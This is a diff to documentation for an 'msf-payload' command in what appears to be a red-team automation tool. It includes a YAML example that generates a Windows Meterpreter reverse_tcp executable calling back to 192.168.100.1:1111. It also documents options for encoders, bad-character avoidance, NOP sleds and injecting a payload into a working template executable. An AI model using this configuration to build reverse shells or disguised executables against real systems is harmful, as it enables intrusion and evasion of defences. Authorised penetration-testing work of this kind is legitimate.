@@ -2,96 +2,101 @@
 msf-payload
 ===========
 
-Generate metasploit payloads and save the payload to a file.
+Generate a Metasploit payload and save it to a file.
 
 .. code-block:: yaml
 
-   - type: msf-payload
-     cmd: windows/meterpreter/reverse_tcp
-     format: exe
-     payload_options:
-       LHOST: 192.168.100.1
-       LPORT: 1111
-     local_path: /tmp/payload.exe
+   commands:
+     - type: msf-payload
+       cmd: windows/meterpreter/reverse_tcp
+       format: exe
+       payload_options:
+         LHOST: 192.168.100.1
+         LPORT: 1111
+       local_path: /tmp/payload.exe
 
-   - type: shell
-     cmd: cat $LAST_MSF_PAYLOAD
+     - type: shell
+       cmd: cat $LAST_MSF_PAYLOAD
 
 .. confval:: cmd
 
-   The payload to generate.
+   The payload to generate (e.g. ``windows/meterpreter/reverse_tcp``).
 
    :type: str
-   :required: ``True``
+   :required: True
+
+.. confval:: payload_options
+
+   Key-value pairs of payload options such as ``LHOST`` and ``LPORT``.
+
+   :type: Dict[str, str]
 
 .. confval:: format
 
-   Generate the payload in this format. See metasploit documentation to find out the supported formats
+   Output format for the generated payload. Run ``msfvenom --list formats``
+   for supported values or see the Metasploit documentation.
 
    :type: str
    :default: ``raw``
 
-.. confval:: payload_options
-
-   Typical payload_options are LHOST or LPORT for reverse shells. Dict(key/values) of payload options.
-
-   :type: Dict[str,str]
-
 .. confval:: local_path
 
-   Copy the payload to this local path.
-   If not set, the payload will be saved in a temporary path.
+   Path where the generated payload will be saved. If not set, the payload
+   is saved to a temporary path accessible via ``$LAST_MSF_PAYLOAD``.
+
+   :type: str
+
+.. confval:: platform
+
+   Target platform for the payload. Run ``msfvenom --list platforms``
+   for supported values.
+
+   :type: str
+
+.. confval:: encoder
+
+   Encoder to apply to the payload. Run ``msfvenom --list encoders``
+   for supported values.
 
    :type: str
 
 .. confval:: badchars
 
-   Characters to avoid example: '\x00\xff'
+   Characters to avoid in the generated payload (e.g. ``'\x00\xff'``).
 
    :type: str
 
 .. confval:: force_encode
 
-   Force encoding
-
-   :type: bool
-   :default: ``False``
-
-.. confval:: encoder
-
-   The encoder to use. ``msfvenom --list  encoders`` to list
-
-   :type: str
-
-.. confval:: template
-
-   Specify a custom executable file to use as a template
-
-   :type: str(path)
-
-.. confval:: platform
-
-   The platform for the payload. ``msfvenom --list platforms`` to list
-
-   :type: str
-
-.. confval:: keep_template_working
-
-   Preserve the template behaviour and inject the payload as a new thread
+   Force encoding even if no encoder is explicitly specified.
 
    :type: bool
    :default: ``False``
 
 .. confval:: nopsled_size
 
-   Prepend a nopsled of [length] size on to the payload
+   Number of NOP bytes (nopsled) to prepend to the payload.
 
    :type: int
    :default: ``0``
 
+.. confval:: template
+
+   Path to a custom executable to use as a template for the payload.
+
+   :type: str
+
+.. confval:: keep_template_working
+
+   Inject the payload as a new thread so the template executable continues
+   to function normally.
+
+   :type: bool
+   :default: ``False``
+
 .. confval:: iter
 
-   The number of times to encode the payload
+   Number of times to apply the encoder.
 
    :type: int
    :default: ``0``
